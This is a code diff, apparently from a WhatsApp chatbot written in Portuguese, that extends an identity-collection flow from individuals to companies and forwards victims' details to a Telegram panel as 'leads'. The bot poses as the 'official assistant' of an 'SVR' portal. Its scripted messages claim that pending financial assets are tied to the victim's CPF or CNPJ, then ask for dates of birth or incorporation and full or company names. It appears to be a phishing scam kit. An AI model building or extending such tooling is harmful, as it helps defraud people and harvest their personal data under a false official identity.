@@ -169,7 +169,7 @@ async function notifyTelegram(html, messageId) {
 }
 
 // Monta o texto do painel de cadastro no Telegram (editável)
-function buildCadastroMessage(chatId, nome, dataNasc, status) {
+function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF') {
     const statusEmoji = {
         'preenchendo_data': '⏳',
         'preenchendo_nome': '⏳',
@@ -189,11 +189,16 @@ function buildCadastroMessage(chatId, nome, dataNasc, status) {
         statusMsg = pos ? `🕐 <b>Na fila — Posição: ${pos}º</b>` : `🕐 <b>Na fila de processamento</b>`;
     }
 
+    const tipoLabel = tipo === 'CNPJ' ? '🏢 Pessoa Jurídica (CNPJ)' : '👤 Pessoa Física (CPF)';
+    const dataLabel = tipo === 'CNPJ' ? 'Data de Abertura' : 'Data de Nascimento';
+    const nomeLabel = tipo === 'CNPJ' ? 'Razão Social' : 'Nome Completo';
+
     return `${statusEmoji} <b>NOVO CADASTRO EM ANDAMENTO</b>\n\n` +
-        `👤 <b>Lead:</b> <code>${chatId}</code>\n\n` +
+        `👤 <b>Lead:</b> <code>${chatId}</code>\n` +
+        `📄 <b>Tipo:</b> ${tipoLabel}\n\n` +
         `📋 <b>Dados do Titular:</b>\n` +
-        `• Data de Nascimento: ${dataDisplay}\n` +
-        `• Nome Completo: ${nomeDisplay}\n\n` +
+        `• ${dataLabel}: ${dataDisplay}\n` +
+        `• ${nomeLabel}: ${nomeDisplay}\n\n` +
         `📊 <b>Status:</b> ${statusMsg}`;
 }
 
@@ -309,6 +314,12 @@ client.on('message_create', async (msg) => {
         const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
         const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
 
+        // Detecta o tipo de documento (CPF ou CNPJ) enviado pelo site
+        const docTypeMatch = text.match(/Tipo de Documento: \*(CPF|CNPJ)\*/i);
+        const docType = docTypeMatch ? docTypeMatch[1].toUpperCase() : 'CPF';
+        const isPJ = docType === 'CNPJ';
+        console.log(`📄 [DOC] Tipo detectado: ${docType} para ${targetChatId}`);
+
         console.log(`🚀 [SVR] Atendimento Iniciado: ${targetChatId}`);
 
         let expectedData = null;
@@ -325,22 +336,28 @@ client.on('message_create', async (msg) => {
         }
 
         // Envia mensagem inicial no Telegram (painel de cadastro)
-        const tgMsgId = await notifyTelegram(buildCadastroMessage(targetChatId, null, null, 'preenchendo_data'));
+        const tgMsgId = await notifyTelegram(buildCadastroMessage(targetChatId, null, null, 'preenchendo_data', docType));
 
         chatSessions.set(targetChatId, {
             mode: 'bot',
             step: 1,
             userId,
             expectedData,
+            docType,   // 'CPF' ou 'CNPJ'
             lastMsgTime: Date.now(),
             createdAt: Date.now(),
-            tgMsgId // ID da mensagem do Telegram para edição
+            tgMsgId
         });
         saveSessions();
 
         setTimeout(async () => {
-            await client.sendMessage(targetChatId,
-                `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
+            if (isPJ) {
+                await client.sendMessage(targetChatId,
+                    `🏢 *Portal SVR — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
+            } else {
+                await client.sendMessage(targetChatId,
+                    `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
+            }
         }, 1500);
         return;
     }
@@ -388,13 +405,16 @@ client.on('message_create', async (msg) => {
     const chat = await msg.getChat();
     await chat.sendStateTyping();
 
-    // --- ETAPA 1: DATA DE NASCIMENTO ---
+    const isPJ = currentSession.docType === 'CNPJ';
+
+    // --- ETAPA 1: DATA (nascimento para PF / abertura para PJ) ---
     if (currentSession.step === 1) {
         const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4}|\d{2})/);
 
         if (!dateMatch) {
             const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
-            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe sua *Data de Nascimento* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
+            const dataLabel = isPJ ? 'Data de Abertura da empresa' : 'Data de Nascimento';
+            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
             await msg.reply(aiReply || fallback);
             return;
         }
@@ -418,19 +438,25 @@ client.on('message_create', async (msg) => {
         chatSessions.set(targetChatId, currentSession);
         saveSessions();
 
-        // Atualiza o painel no Telegram (edita a mensagem existente)
+        // Atualiza o painel no Telegram
         if (currentSession.tgMsgId) {
             await notifyTelegram(
-                buildCadastroMessage(targetChatId, null, typedDate, 'preenchendo_nome'),
+                buildCadastroMessage(targetChatId, null, typedDate, 'preenchendo_nome', currentSession.docType),
                 currentSession.tgMsgId
             );
         }
 
-        await msg.reply(
-            `✅ *Data de nascimento confirmada!*\n\n` +
-            `📍 *ETAPA 2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
+        if (isPJ) {
+            await msg.reply(
+                `✅ *Data de abertura confirmada!*\n\n` +
+                `📍 *ETAPA 2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
+        } else {
+            await msg.reply(
+                `✅ *Data de nascimento confirmada!*\n\n` +
+                `📍 *ETAPA 2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
+        }
 
-    // --- ETAPA 2: NOME COMPLETO ---
+    // --- ETAPA 2: NOME / RAZÃO SOCIAL ---
     } else if (currentSession.step === 2) {
         const typedName = text.trim();
 
@@ -456,12 +482,13 @@ client.on('message_create', async (msg) => {
             addToQueue(targetChatId, typedName, currentSession.birthDate);
             const queuePos = getQueuePosition(targetChatId);
             const queueSize = waitingQueue.length;
+            const tipoLabel = isPJ ? 'Pessoa Jurídica (CNPJ)' : 'Pessoa Física (CPF)';
             const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
 
             // Edita a mensagem no Telegram com cadastro completo + posição na fila
             if (currentSession.tgMsgId) {
                 await notifyTelegram(
-                    buildCadastroMessage(targetChatId, typedName, currentSession.birthDate, 'na_fila'),
+                    buildCadastroMessage(targetChatId, typedName, currentSession.birthDate, 'na_fila', currentSession.docType),
                     currentSession.tgMsgId
                 );
             }
